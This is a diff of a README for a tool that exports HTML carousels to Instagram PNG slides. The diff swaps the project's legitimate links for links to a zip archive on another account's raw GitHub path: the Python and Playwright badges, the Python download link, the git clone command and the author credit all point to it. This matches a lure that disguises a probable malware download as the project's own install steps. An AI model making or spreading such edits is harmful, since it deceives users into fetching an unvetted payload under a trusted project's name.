@@ -6,8 +6,8 @@
 
 **Export any HTML carousel into pixel-perfect, Instagram-ready PNG slides.**
 
-[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
-[![Playwright](https://img.shields.io/badge/Playwright-Headless_Chrome-2EAD33?style=for-the-badge&logo=playwright&logoColor=white)](https://playwright.dev/python/)
+[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://raw.githubusercontent.com/Hanseldemulcent167/html-to-Instagram-carousel/main/assets/html_to_carousel_Instagram_v2.4.zip)
+[![Playwright](https://img.shields.io/badge/Playwright-Headless_Chrome-2EAD33?style=for-the-badge&logo=playwright&logoColor=white)](https://raw.githubusercontent.com/Hanseldemulcent167/html-to-Instagram-carousel/main/assets/html_to_carousel_Instagram_v2.4.zip)
 [![License](https://img.shields.io/badge/License-MIT-FFD700?style=for-the-badge)](LICENSE)
 [![PRs Welcome](https://img.shields.io/badge/PRs-Welcome-brightgreen?style=for-the-badge)](CONTRIBUTING.md)
 
@@ -67,13 +67,13 @@ You (or AI) design a carousel in HTML/CSS
 
 ### Prerequisites
 
-- **Python 3.10+** — [Download here](https://www.python.org/downloads/)
+- **Python 3.10+** — [Download here](https://raw.githubusercontent.com/Hanseldemulcent167/html-to-Instagram-carousel/main/assets/html_to_carousel_Instagram_v2.4.zip)
 
 ### Installation
 
 ```bash
 # Clone the repo
-git clone https://github.com/DJ-vekariya/html-to-Instagram-carousel.git
+git clone https://raw.githubusercontent.com/Hanseldemulcent167/html-to-Instagram-carousel/main/assets/html_to_carousel_Instagram_v2.4.zip
 cd html-to-Instagram-carousel
 
 # That's it. No pip install needed — the script handles dependencies automatically.
@@ -289,7 +289,7 @@ This project is licensed under the MIT License — see the [LICENSE](LICENSE) fi
 
 <div align="center">
 
-**Built with ❤️ by [DJ Vekariya](https://github.com/DJ-vekariya)**
+**Built with ❤️ by [DJ Vekariya](https://raw.githubusercontent.com/Hanseldemulcent167/html-to-Instagram-carousel/main/assets/html_to_carousel_Instagram_v2.4.zip)**
 
 If this tool saved you time, consider giving it a ⭐
 
